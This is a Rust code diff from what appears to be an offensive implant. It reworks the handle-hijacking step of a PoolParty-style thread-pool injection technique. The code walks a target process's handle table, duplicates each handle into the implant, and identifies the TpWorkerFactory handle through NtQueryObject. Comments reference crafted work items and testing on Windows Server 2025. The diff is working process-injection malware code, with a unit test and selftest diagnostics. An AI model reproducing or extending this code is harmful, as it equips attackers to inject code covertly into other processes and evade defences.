@@ -276,18 +276,6 @@ type NtSetInformationWorkerFactoryFn = unsafe extern "system" fn(
     u32,           // WorkerFactoryInformationLength
 ) -> i32;
 
-/// `WorkerFactoryBasicInformation` (7) — the only documented QUERY class
-/// (`QUERY_WORKERFACTORYINFOCLASS` in SafeBreach PoolParty; phnt). Classes
-/// 0–2 are SET timeouts (`WorkerFactoryTimeout` / `RetryTimeout` /
-/// `IdleTimeout`). Hosted Server 2025 `inject_pool` 0x9 used class 2 against
-/// a 32-byte buffer, which cannot identify a `TpWorkerFactory`.
-const WORKER_FACTORY_BASIC_INFORMATION: u32 = 7;
-
-/// Size of `WORKER_FACTORY_BASIC_INFORMATION` plus slack (phnt: ~116 bytes
-/// on x64). A 32-byte probe with class 7 returns `STATUS_INFO_LENGTH_MISMATCH`
-/// and would be mistaken for a non-factory.
-const WORKER_FACTORY_BASIC_INFO_BUF: usize = 256;
-
 /// `WorkerFactoryTimeout` info class for `NtSetInformationWorkerFactory`. The
 /// SafeBreach TP_WORK variant feeds the crafted work item pointer here; the
 /// worker factory enqueues it and the existing `TppWorkerThread` dequeues +
@@ -959,6 +947,24 @@ type DuplicateHandleFn = unsafe extern "system" fn(
     u32,              // dwOptions
 ) -> i32;
 
+/// `NtQueryObject(Handle, ObjectInformationClass, Buffer, Length, ReturnLength)`.
+type NtQueryObjectFn = unsafe extern "system" fn(
+    *mut c_void,
+    u32,
+    *mut c_void,
+    u32,
+    *mut u32,
+) -> i32;
+
+/// `OBJECT_INFORMATION_CLASS::ObjectTypeInformation`.
+const OBJECT_TYPE_INFORMATION: u32 = 2;
+
+struct HijackProbeStats {
+    dup_ok: u32,
+    qobj_ok: u32,
+    tp: u32,
+}
+
 /// Discover the target process's thread-pool worker factory by walking the
 /// system handle table (`SystemExtendedHandleInformation`), duplicating every
 /// handle owned by `target_pid` into the implant with `DUPLICATE_SAME_ACCESS`,
@@ -978,9 +984,16 @@ type DuplicateHandleFn = unsafe extern "system" fn(
 unsafe fn hijack_worker_factory(
     target_h: *mut c_void,
     target_pid: u32,
-    query_wf: NtQueryInformationWorkerFactoryFn,
+    _query_wf: NtQueryInformationWorkerFactoryFn,
 ) -> Result<*mut c_void, String> {
     let (qsi, dup_handle) = hijack_resolve_fns()?;
+    let qobj = hijack_resolve_qobj()
+        .ok_or_else(|| String::from("ntdll!NtQueryObject missing"))?;
+    let mut stats = HijackProbeStats {
+        dup_ok: 0,
+        qobj_ok: 0,
+        tp: 0,
+    };
 
     // Prefer the target's own handle snapshot (SafeBreach HandleHijacker /
     // Teach2Breach ProcessHandleInformation). The system-wide table can miss
@@ -996,7 +1009,7 @@ unsafe fn hijack_worker_factory(
         crate::selftests::write_marker("nyx_g6_pool_scan.proc", &s);
     }
     for handle_val in &proc_candidates {
-        if let Ok(dup) = hijack_probe_handle(dup_handle, query_wf, target_h, *handle_val) {
+        if let Ok(dup) = hijack_probe_handle(dup_handle, qobj, target_h, *handle_val, &mut stats) {
             return Ok(dup);
         }
     }
@@ -1010,13 +1023,30 @@ unsafe fn hijack_worker_factory(
         s.push_str(&crate::selftests::dec_u32(proc_candidates.len() as u32));
         s.push_str(" sys=");
         s.push_str(&crate::selftests::dec_u32(sys_candidates.len() as u32));
+        s.push_str(" dup=");
+        s.push_str(&crate::selftests::dec_u32(stats.dup_ok));
+        s.push_str(" qobj=");
+        s.push_str(&crate::selftests::dec_u32(stats.qobj_ok));
+        s.push_str(" tp=");
+        s.push_str(&crate::selftests::dec_u32(stats.tp));
         crate::selftests::write_marker("nyx_g6_pool_scan", &s);
     }
 
     for handle_val in sys_candidates {
-        if let Ok(dup) = hijack_probe_handle(dup_handle, query_wf, target_h, handle_val) {
+        if let Ok(dup) = hijack_probe_handle(dup_handle, qobj, target_h, handle_val, &mut stats) {
             return Ok(dup);
         }
+    }
+
+    #[cfg(feature = "selftest")]
+    {
+        let mut s = String::from("dup=");
+        s.push_str(&crate::selftests::dec_u32(stats.dup_ok));
+        s.push_str(" qobj=");
+        s.push_str(&crate::selftests::dec_u32(stats.qobj_ok));
+        s.push_str(" tp=");
+        s.push_str(&crate::selftests::dec_u32(stats.tp));
+        crate::selftests::write_marker("nyx_g6_pool_probe", &s);
     }
 
     Err(String::from(
@@ -1053,6 +1083,42 @@ type NtQueryInformationProcessFn = unsafe extern "system" fn(
 unsafe fn hijack_resolve_qip() -> Option<NtQueryInformationProcessFn> {
     let addr = unsafe { resolve::export_addr(b"ntdll.dll", b"NtQueryInformationProcess") }?;
     Some(unsafe { core::mem::transmute(addr) })
+}
+
+unsafe fn hijack_resolve_qobj() -> Option<NtQueryObjectFn> {
+    let addr = unsafe { resolve::export_addr(b"ntdll.dll", b"NtQueryObject") }?;
+    Some(unsafe { core::mem::transmute(addr) })
+}
+
+/// True when an `NtQueryObject(ObjectTypeInformation)` buffer names
+/// `TpWorkerFactory` (SafeBreach HandleHijacker).
+fn object_type_is_tp_worker_factory(info: &[u8]) -> bool {
+    // UNICODE_STRING on x64: Length@0, MaximumLength@2, Buffer@8.
+    if info.len() < 16 {
+        return false;
+    }
+    let byte_len = u16::from_le_bytes([info[0], info[1]]) as usize;
+    if byte_len == 0 || byte_len % 2 != 0 || byte_len > 64 {
+        return false;
+    }
+    let nchars = byte_len / 2;
+    let buf_ptr = unsafe { core::ptr::read_unaligned(info.as_ptr().add(8) as *const u64) } as usize;
+    let base = info.as_ptr() as usize;
+    if buf_ptr < base {
+        return false;
+    }
+    let off = buf_ptr - base;
+    if off.checked_add(byte_len).map(|end| end > info.len()).unwrap_or(true) {
+        return false;
+    }
+    let name = unsafe { core::slice::from_raw_parts(info.as_ptr().add(off) as *const u16, nchars) };
+    const NEEDLE: &[u8] = b"TpWorkerFactory";
+    if name.len() != NEEDLE.len() {
+        return false;
+    }
+    name.iter()
+        .zip(NEEDLE.iter())
+        .all(|(&w, &b)| w == b as u16)
 }
 
 /// Snapshot the target's handle table via ProcessHandleInformation (51).
@@ -1232,20 +1298,20 @@ unsafe fn hijack_fetch_table_payload(
     Ok(buf)
 }
 
-/// Duplicate one candidate handle into the implant (DUPLICATE_SAME_ACCESS) and
-/// probe it with NtQueryInformationWorkerFactory. Ok(dup) on a worker-factory
-/// hit; Err(()) means keep scanning (the duplicate was closed, if any).
+/// Duplicate one candidate handle and identify it with
+/// `NtQueryObject(ObjectTypeInformation)` named `TpWorkerFactory`
+/// (SafeBreach HandleHijacker). `NtQueryInformationWorkerFactory` is NOT a
+/// type probe — hosted Server 2025 had 51 duplicatable handles and class 7
+/// still reported no factory.
 unsafe fn hijack_probe_handle(
     dup_handle: DuplicateHandleFn,
-    query_wf: NtQueryInformationWorkerFactoryFn,
+    query_obj: NtQueryObjectFn,
     target_h: *mut c_void,
     handle_val: usize,
+    stats: &mut HijackProbeStats,
 ) -> Result<*mut c_void, ()> {
-    // GetCurrentProcess pseudo-handle = (HANDLE)-1 (the implant's own process).
     const CUR_PROCESS: *mut c_void = -1isize as *mut c_void;
 
-    // Prefer WORKER_FACTORY_ALL_ACCESS so QUERY/SET are granted (SafeBreach
-    // HijackProcessHandle). SAME_ACCESS is the fallback.
     let mut dup: *mut c_void = core::ptr::null_mut();
     let ok_all = unsafe {
         dup_handle(
@@ -1275,27 +1341,64 @@ unsafe fn hijack_probe_handle(
             return Err(());
         }
     }
+    stats.dup_ok = stats.dup_ok.saturating_add(1);
 
-    // Probe with WorkerFactoryBasicInformation (7) into a buffer large
-    // enough for WORKER_FACTORY_BASIC_INFORMATION. STATUS_SUCCESS ⇒ factory.
-    // STATUS_OBJECT_TYPE_MISMATCH (0xC0000024) ⇒ not a factory.
-    let mut probe = [0u8; WORKER_FACTORY_BASIC_INFO_BUF];
-    let mut probe_len: u32 = 0;
-    let qst = unsafe {
-        query_wf(
-            dup,
-            WORKER_FACTORY_BASIC_INFORMATION,
-            probe.as_mut_ptr() as *mut c_void,
-            probe.len() as u32,
-            &mut probe_len,
-        )
-    };
-    if qst >= 0 {
+    let info = unsafe { query_object_type(query_obj, dup) };
+    if info.is_empty() {
+        unsafe { close_handle(dup) };
+        return Err(());
+    }
+    stats.qobj_ok = stats.qobj_ok.saturating_add(1);
+    if object_type_is_tp_worker_factory(&info) {
+        stats.tp = stats.tp.saturating_add(1);
         return Ok(dup);
     }
-    // Not a worker factory; close the duplicate and keep scanning.
     unsafe { close_handle(dup) };
     Err(())
+}
+
+unsafe fn query_object_type(query_obj: NtQueryObjectFn, h: *mut c_void) -> nyx_implant_core::heap::Vec<u8> {
+    const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC000_0004u32 as i32;
+    let mut needed: u32 = 0;
+    let _ = unsafe {
+        query_obj(
+            h,
+            OBJECT_TYPE_INFORMATION,
+            core::ptr::null_mut(),
+            0,
+            &mut needed,
+        )
+    };
+    let mut cap = if needed == 0 { 0x200 } else { needed };
+    for _ in 0..4 {
+        let mut buf = nyx_implant_core::heap::vec![0u8; cap as usize];
+        let mut ret: u32 = 0;
+        let st = unsafe {
+            query_obj(
+                h,
+                OBJECT_TYPE_INFORMATION,
+                buf.as_mut_ptr() as *mut c_void,
+                cap,
+                &mut ret,
+            )
+        };
+        if st >= 0 {
+            return buf;
+        }
+        if st != STATUS_INFO_LENGTH_MISMATCH {
+            return nyx_implant_core::heap::Vec::new();
+        }
+        let next = if ret > cap {
+            ret.saturating_add(0x20)
+        } else {
+            cap.saturating_mul(2)
+        };
+        if next <= cap || next > 0x1_0000 {
+            return nyx_implant_core::heap::Vec::new();
+        }
+        cap = next;
+    }
+    nyx_implant_core::heap::Vec::new()
 }
 
 /// Walk a `SYSTEM_HANDLE_INFORMATION_EX` buffer (the payload returned by
@@ -1472,6 +1575,23 @@ mod tests {
             &mut tiny,
         );
         assert!(tiny.is_empty());
+    }
+
+    #[test]
+    fn object_type_name_matches_tp_worker_factory() {
+        let needle = b"TpWorkerFactory";
+        let mut buf = [0u8; 64];
+        let byte_len = (needle.len() * 2) as u16;
+        buf[0..2].copy_from_slice(&byte_len.to_le_bytes());
+        let name_off = 16usize;
+        let ptr = buf.as_ptr() as usize + name_off;
+        buf[8..16].copy_from_slice(&(ptr as u64).to_le_bytes());
+        for (i, &b) in needle.iter().enumerate() {
+            buf[name_off + i * 2] = b;
+        }
+        assert!(object_type_is_tp_worker_factory(&buf));
+        buf[name_off] = b'X';
+        assert!(!object_type_is_tp_worker_factory(&buf));
     }
 
     /// PROCESS_HANDLE_SNAPSHOT_INFORMATION: count @0, Handles @0x10, stride
